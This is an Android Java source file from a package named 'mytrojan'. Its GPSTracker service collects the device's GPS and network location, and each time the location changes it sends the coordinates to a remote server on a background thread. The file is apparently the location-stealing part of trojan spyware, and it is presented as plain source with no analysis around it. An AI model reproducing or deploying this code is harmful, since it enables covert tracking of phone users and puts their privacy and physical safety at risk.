package com.example.mytrojan;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.Service;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;


public class GPSTracker extends Service implements LocationListener
{
    private final Context mContext;

    boolean isGPSEnabled = false;

    boolean isNetworkEnabled = false;

    boolean canGetLocation = false;

    Location location;
    double latitude;
    double longitude;

    private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 10; // metre

    private static final long MIN_TIME_BW_UPDATES = 1000 * 60 * 1; // dakika

    protected LocationManager locationManager;


    public GPSTracker(Context context)
    {
        this.mContext = context;
        getLocation();
    }

    // Check whether user has phone contacts manipulation permission or not.
    private boolean hasPhonePermission(String permission)
    {
        boolean ret = false;

        // If android sdk version is bigger than 23 the need to check run time permission.
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {

            // return phone read contacts permission grant status.
            int hasPermission = ContextCompat.checkSelfPermission(this.mContext, permission);
            // If permission is granted then return true.
            if (hasPermission == PackageManager.PERMISSION_GRANTED) {
                ret = true;
            }

        }else {
            ret = true;
        }

        return ret;
    }

    // Request a runtime permission to app user.
    private void requestPermission(String []permission)
    {
        String requestPermissionArray[] = (String[]) permission;
        ActivityCompat.requestPermissions((Activity) this.mContext, requestPermissionArray, 1);
    }


    @SuppressLint("MissingPermission")
    public Location getLocation()
    {
        try
        {
            locationManager = (LocationManager) mContext.getSystemService(LOCATION_SERVICE);

            isGPSEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);

            isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);

            if (!isGPSEnabled && !isNetworkEnabled)
            {

            }
            else
            {
                this.canGetLocation = true;

                // Once internetten alinan konum bilgisi kayitlanir
                if (isNetworkEnabled)
                {
                    locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
                    Log.d("Network", "Network");
                    if (locationManager != null)
                    {
                        location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                        if (location != null)
                        {
                            latitude = location.getLatitude();
                            longitude = location.getLongitude();
                        }
                    }
                }
                // GPS'ten alinan konum bilgisi;
                if (isGPSEnabled)
                {
                    if (!hasPhonePermission(Manifest.permission.ACCESS_FINE_LOCATION) || !hasPhonePermission(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                        requestPermission(new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION});
                    }


                    if (location == null)
                    {
                        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
                        Log.d("GPS Enabled", "GPS Enabled");
                        if (locationManager != null)
                        {
                            location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                            if (location != null)
                            {
                                latitude = location.getLatitude();
                                longitude = location.getLongitude();
                            }
                        }
                    }
                }
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }

        return location;
    }

    public double getLatitude()
    {
        if(location != null)
        {
            latitude = location.getLatitude();
        }

        return latitude;
    }

    public double getLongitude()
    {
        if(location != null)
        {
            longitude = location.getLongitude();
        }

        return longitude;
    }

    @Override
    public void onLocationChanged(Location location)
    {
        this.location = location;

        double latitude = this.getLatitude();
        double longitude = this.getLongitude();

        // send to remote server
        // post content to server
        String content = "(" + latitude + "," + longitude + ")";
        new Thread(new RequestHttp(content)).start();

        System.out.println(content);
    }

    @Override
    public void onProviderDisabled(String provider)
    {
    }

    @Override
    public void onProviderEnabled(String provider)
    {
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras)
    {
    }

    @Override
    public IBinder onBind(Intent arg0)
    {
        return null;
    }

    public boolean canGetLocation()
    {
        return this.canGetLocation;
    }

    // Konum bilgisi kapali ise kullaniciya ayarlar sayfasina baglanti iceren bir mesaj goruntulenir
    public void showSettingsAlert()
    {
        AlertDialog.Builder alertDialog = new AlertDialog.Builder(mContext);

        // Mesaj basligi
        alertDialog.setTitle("GPS Kapalı");

        // Mesaj
        alertDialog.setMessage("Konum bilgisi alınamıyor. Ayarlara giderek gps'i aktif hale getiriniz.");

        // Mesaj ikonu
        //alertDialog.setIcon(R.drawable.delete);

        // Ayarlar butonuna tiklandiginda
        alertDialog.setPositiveButton("Ayarlar", new DialogInterface.OnClickListener()
        {
            public void onClick(DialogInterface dialog,int which)
            {
                Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                mContext.startActivity(intent);
            }
        });

        // Iptal butonuna tiklandiginda
        alertDialog.setNegativeButton("İptal", new DialogInterface.OnClickListener()
        {
            public void onClick(DialogInterface dialog, int which)
            {
                dialog.cancel();
            }
        });

        // Mesaj kutusunu goster
        alertDialog.show();
    }

    public void stopUsingGPS()
    {
        if(locationManager != null)
        {
            locationManager.removeUpdates(GPSTracker.this);
        }
    }
}